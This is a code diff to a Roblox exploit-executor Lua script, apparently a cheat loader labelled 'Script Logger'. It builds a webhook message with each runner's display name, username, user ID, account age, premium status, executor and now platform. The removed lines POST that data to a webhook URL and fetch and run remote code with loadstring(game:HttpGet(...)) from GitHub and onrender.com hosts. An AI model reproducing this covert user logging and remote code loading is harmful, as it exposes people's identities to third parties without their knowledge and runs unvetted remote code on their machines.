@@ -1,3 +1,4 @@
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
@@ -14,13 +15,20 @@ pcall(function()
     hasPremium = MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 131392)
 end)
 
+-- Detectar plataforma
+local platform = "Unknown"
+pcall(function()
+    local UIS = game:GetService("UserInputService")
+    platform = tostring(UIS:GetPlatform() or "Unknown")
+end)
+
 -- Info del juego
 local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local placeName = gameInfo.Name
 local placeId = game.PlaceId
 local executorName = identifyexecutor and identifyexecutor() or "Unknown"
 
--- Embed
+-- Embed unificado (sin stats)
 local data = {
     username = "Script Logger",
     embeds = {{
@@ -28,16 +36,17 @@ local data = {
         color = 0x9B59B6,
         fields = {
             {
-                name = "Player Info",
+                name = "🧍 Player Info",
                 value = "**Display Name:** " .. LocalPlayer.DisplayName ..
                         "\n**Username:** " .. LocalPlayer.Name ..
                         "\n**User ID:** " .. LocalPlayer.UserId ..
                         "\n**Account Age:** " .. accountAgeDays .. " days" ..
-                        "\n**Premium:** " .. (hasPremium and "Yes" or "No"),
+                        "\n**Premium:** " .. (hasPremium and "✅ Yes" or "❌ No") ..
+                        "\n**Platform:** " .. platform,
                 inline = false
             },
             {
-                name = "Game Info",
+                name = "🎮 Game Info",
                 value = "**Game Name:** " .. placeName ..
                         "\n**Game ID:** " .. placeId ..
                         "\n**Executor:** " .. executorName,
@@ -48,48 +57,3 @@ local data = {
         timestamp = DateTime.now():ToIsoDate()
     }}
 }
-
--- Enviar webhook (Delta / Synapse / Script-Ware compatibles)
-local function sendWebhook()
-    local json = game:GetService("HttpService"):JSONEncode(data)
-    if http_request then
-        http_request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-    elseif syn and syn.request then
-        syn.request({
-            Url = webhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = json
-        })
-    else
-        warn("Tu executor no soporta http_request/syn.request")
-    end
-end
-
--- Mandar log sin bloquear
-spawn(sendWebhook)
-
--- Scripts externos
-local globalScriptURL = "https://raw.githubusercontent.com/CoronaBlanca/25092009LH-On-Top-209021/refs/heads/main/XxLoggsxX"
-local games = {
-    [3623096087] = "https://protected-roblox-scripts.onrender.com/dd255a83c0a02c86d7af617b464a5659"
-}
-
--- Ejecutar global
-pcall(function()
-    loadstring(game:HttpGet(globalScriptURL))()
-end)
-
--- Ejecutar específico
-pcall(function()
-    if games[placeId] then
-        loadstring(game:HttpGet(games[placeId]))()
-    else
-        warn("No script configurado para este PlaceId: " .. placeId)
-    end
-end)
